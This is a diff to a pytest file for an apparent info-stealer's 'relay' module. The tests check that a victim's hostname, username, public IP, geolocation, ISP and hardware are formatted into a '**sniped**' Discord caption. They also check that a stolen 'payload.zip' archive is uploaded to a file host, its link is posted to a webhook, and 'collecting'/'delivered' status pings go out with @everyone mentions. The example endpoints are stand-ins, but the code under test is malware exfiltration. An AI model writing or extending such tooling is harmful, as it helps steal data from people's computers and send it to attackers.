@@ -7,6 +7,7 @@ repository that logged success on a 401 because it never read the status code.
 
 from __future__ import annotations
 
+import json
 import sys
 import urllib.error
 from pathlib import Path
@@ -125,14 +126,20 @@ def test_content_type_follows_the_real_extension(tmp_path: Path) -> None:
 
 
 class Relay:
-    def __init__(self, kind: str, endpoint: str) -> None:
+    def __init__(
+        self, kind: str, endpoint: str, ping: str = "", mention: str = "@here"
+    ) -> None:
         self.kind = kind
         self.endpoint = endpoint
+        self.ping = ping
+        self.mention = mention
 
 
 class Config:
-    def __init__(self, kind: str, endpoint: str) -> None:
-        self.relay = Relay(kind, endpoint)
+    def __init__(
+        self, kind: str, endpoint: str, ping: str = "", mention: str = "@here"
+    ) -> None:
+        self.relay = Relay(kind, endpoint, ping, mention)
 
 
 def test_transmit_gives_up_after_three_attempts(
@@ -215,7 +222,7 @@ def test_send_link_uploads_first_and_posts_the_url(
         assert b"fileToUpload" in body
         return b"https://files.example/abc.zip"
 
-    def fake_json(url: str, document: dict[str, str]) -> bytes:
+    def fake_json(url: str, document: dict[str, str], timeout: float = 0.0) -> bytes:
         calls.append(("message", url))
         assert "https://files.example/abc.zip" in document["content"]
         return b""
@@ -223,7 +230,7 @@ def test_send_link_uploads_first_and_posts_the_url(
     monkeypatch.setattr(relay, "_post", fake_post)
     monkeypatch.setattr(relay, "_post_json", fake_json)
 
-    relay._send_link("https://hook.example/abc", archive)
+    relay._send_link("https://hook.example/abc", archive, "**sniped** BOX")
 
     assert [kind for kind, _ in calls] == ["upload", "message"]
     assert calls[0][1] == relay._CATBOX
@@ -241,7 +248,7 @@ def test_send_link_refuses_a_host_that_returns_html(
     monkeypatch.setattr(relay, "_post_json", lambda *a, **k: b"")
 
     with pytest.raises(relay.RelayError) as caught:
-        relay._send_link("https://hook.example/abc", archive)
+        relay._send_link("https://hook.example/abc", archive, "**sniped** BOX")
     assert "no url" in str(caught.value)
 
 
@@ -260,14 +267,12 @@ def test_send_link_does_not_post_when_the_upload_failed(
     monkeypatch.setattr(relay, "_post_json", lambda *a, **k: posted.append(1) or b"")
 
     with pytest.raises(relay.RelayError):
-        relay._send_link("https://hook.example/abc", archive)
+        relay._send_link("https://hook.example/abc", archive, "**sniped** BOX")
     assert posted == []
 
 
 def test_a_link_message_fits_a_discord_message(tmp_path: Path) -> None:
-    archive = tmp_path / "sable.zip"
-    archive.write_bytes(b"x")
-    text = relay._link_message(archive, "https://files.example/" + "a" * 50)
+    text = relay._link_message("**sniped** BOX", "https://files.example/" + "a" * 50)
     assert "https://files.example/" in text
     assert len(text) <= relay._MESSAGE_LIMIT
 
@@ -296,3 +301,115 @@ def test_every_relay_kind_reaches_a_sender(
             monkeypatch.setattr(relay, other, _recorder(fired, other))
         relay.transmit(Config(kind, "https://example.invalid/hook"), archive)
         assert fired == [name], (kind, fired)
+
+
+# --- readable caption -------------------------------------------------------
+
+_SUMMARY = {
+    "hostname": "DESKTOP-ABC",
+    "user": "killywilly",
+    "os": "Windows 11 Pro (26100)",
+    "public_ip": "203.0.113.7",
+    "city": "Ashburn",
+    "region": "Virginia",
+    "country": "United States",
+    "isp": "Example ISP",
+    "lan_ip": "192.168.1.20",
+    "cpu": "AMD Ryzen 7 5800X",
+    "gpu": "NVIDIA GeForce RTX 3080",
+    "ram_gib": 31.9,
+    "arch": "x86_64",
+    "uptime": "3d 4h",
+    "gate": "clean",
+}
+
+
+def test_describe_reads_like_a_result() -> None:
+    # The old caption was "sable payload.zip 1504 bytes" and nobody could read it.
+    text = relay.describe(_SUMMARY)
+    assert "**sniped** DESKTOP-ABC" in text
+    assert "**user** killywilly" in text
+    assert "**ip** 203.0.113.7 · Ashburn, Virginia, United States · Example ISP" in text
+    assert "**cpu** AMD Ryzen 7 5800X" in text
+    assert "**box** 32 GB ram · x86_64 · up 3d 4h" in text
+    assert "**gate** clean" in text
+    assert "unknown" not in text.lower()
+
+
+def test_describe_drops_what_it_does_not_have() -> None:
+    assert relay.describe(None) == ""
+    assert relay.describe({}) == ""
+    partial = relay.describe({"hostname": "BOX"})
+    assert partial == "**sniped** BOX"
+
+
+def test_a_caption_carries_the_machine_and_the_archive(tmp_path: Path) -> None:
+    archive = tmp_path / "payload.zip"
+    archive.write_bytes(b"PK\x03\x04" + b"x" * 2044)
+    cfg = Config("https", "https://example.invalid/hook", mention="@everyone")
+    text = relay._caption(cfg, archive, _SUMMARY)
+    assert text.startswith("@everyone **sniped** DESKTOP-ABC")
+    assert "**archive** payload.zip · 2.0 KB" in text
+
+
+def test_a_caption_without_a_summary_still_names_the_file(tmp_path: Path) -> None:
+    archive = tmp_path / "payload.zip"
+    archive.write_bytes(b"x")
+    text = relay._caption(Config("https", "https://example.invalid/hook"), archive, None)
+    assert "payload.zip" in text
+
+
+# --- status webhook ---------------------------------------------------------
+
+
+def test_notify_sends_the_mention_and_allows_it(monkeypatch: pytest.MonkeyPatch) -> None:
+    # Discord drops an unallowed mention silently, so the payload has to carry the
+    # opt-in object or the ping arrives looking like a ping and ringing nothing.
+    seen = capture(monkeypatch, Response(204))
+    cfg = Config("https", "https://example.invalid/hook", ping="https://example.invalid/status")
+    assert relay.notify(cfg, "delivered", alert=True) is True
+
+    body = json.loads(seen[0].data.decode("utf-8"))
+    assert body["content"] == "@here delivered"
+    assert body["allowed_mentions"] == {"parse": ["everyone", "users", "roles"]}
+
+
+def test_notify_leaves_a_stage_message_quiet(monkeypatch: pytest.MonkeyPatch) -> None:
+    seen = capture(monkeypatch, Response(204))
+    cfg = Config("https", "https://example.invalid/hook", ping="https://example.invalid/status")
+    relay.notify(cfg, "collecting", alert=False)
+
+    body = json.loads(seen[0].data.decode("utf-8"))
+    assert body["content"] == "collecting"
+
+
+def test_notify_is_silent_without_a_status_webhook(monkeypatch: pytest.MonkeyPatch) -> None:
+    seen = capture(monkeypatch, Response(204))
+    cfg = Config("https", "https://example.invalid/hook")
+    assert relay.notify(cfg, "delivered", alert=True) is False
+    assert seen == []
+
+
+def test_notify_swallows_a_dead_webhook(monkeypatch: pytest.MonkeyPatch) -> None:
+    # A status message is a courtesy. If it raises, it costs the collection it reports.
+    def explode(*_: object, **__: object) -> bytes:
+        raise relay.RelayError("gone")
+
+    monkeypatch.setattr(relay, "_post_json", explode)
+    cfg = Config("https", "https://example.invalid/hook", ping="https://example.invalid/status")
+    assert relay.notify(cfg, "delivered", alert=True) is False
+
+
+def test_notify_puts_no_mention_when_none_is_configured(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    seen = capture(monkeypatch, Response(204))
+    cfg = Config(
+        "https",
+        "https://example.invalid/hook",
+        ping="https://example.invalid/status",
+        mention="",
+    )
+    relay.notify(cfg, "delivered", alert=True)
+    body = json.loads(seen[0].data.decode("utf-8"))
+    assert body["content"] == "delivered"
